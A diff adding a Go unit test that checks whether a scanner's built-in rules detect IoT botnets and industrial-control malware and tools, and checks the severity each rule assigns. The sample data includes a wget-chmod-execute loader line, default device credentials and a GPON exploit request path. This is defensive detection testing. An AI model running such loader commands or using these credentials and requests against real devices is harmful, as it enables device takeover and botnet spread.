@@ -297,6 +297,49 @@ func TestExpandedBuiltinRulesV3(t *testing.T) {
 	}
 }
 
+func TestIoTOTBuiltinRules(t *testing.T) {
+	e := NewEngine()
+	cases := []struct{ rule, data string }{
+		{"IOT_Hajime", "iot worm hajime atk.conf loaded"},
+		{"IOT_Mukashi", "Mukashi bot targeting zyxel"},
+		{"IOT_Enemybot", "EnemyBot ENEMScanner started"},
+		{"IOT_MultiArch_Loader", "wget http://1.2.3.4/x; chmod 777 x; ./x; busybox"},
+		{"IOT_Default_Cred_List", "creds: root xc3511 / root vizxv / admin admin1234"},
+		{"IOT_GPON_Exploit", "POST /GponForm/diag_Form?images/ XWebPageName=diag"},
+		{"OT_Modbus", "import pymodbus.client to talk to plc"},
+		{"OT_BACnet", "using bacpypes WhoIsRequest on the building net"},
+		{"OT_CODESYS", "exploit the CODESYS CmpApp runtime"},
+		{"OT_PLCScan_Tool", "running plcscan against 10.0.0.0/24"},
+		{"OT_Industroyer", "CrashOverride / Industroyer haslo.dat"},
+		{"OT_Triton_Trisis", "deploy trilog.exe and imain.bin (TRISIS)"},
+		{"OT_FrostyGoop", "FrostyGoop BUSTLEBERM modbus attack"},
+		{"BAS_Tridium_Niagara", "Tridium Niagara Framework station.fox"},
+		{"BAS_JohnsonControls_Metasys", "Johnson Controls Metasys supervisor"},
+		{"OT_KNX", "KNXnet/IP tunneling to the building bus"},
+		{"IIOT_SCADA_HMI_Products", "exfil from the WinCC and FactoryTalk servers"},
+	}
+	for _, c := range cases {
+		if !hasMatch(e.Scan([]byte(c.data)), c.rule) {
+			t.Errorf("%s should match %q; got %v", c.rule, c.data, matchNames(e.Scan([]byte(c.data))))
+		}
+	}
+	sev := map[string]string{}
+	for _, r := range e.rules {
+		sev[r.Name] = MatchSeverity(Match{Meta: r.Meta})
+	}
+	for name, want := range map[string]string{
+		"OT_Industroyer":      "critical", // ICS malware
+		"IOT_Hajime":          "critical", // botnet family
+		"OT_Modbus":           "medium",   // protocol reference tagged down
+		"BAS_Tridium_Niagara": "medium",
+		"OT_PLCScan_Tool":     "high", // recon tool
+	} {
+		if sev[name] != want {
+			t.Errorf("%s severity = %q, want %q", name, sev[name], want)
+		}
+	}
+}
+
 func TestBuiltinModuleInjectionRule(t *testing.T) {
 	// The injection triad is a PE-only rule: it must not fire on a non-PE that
 	// merely mentions the API names as text (the module reads real imports).
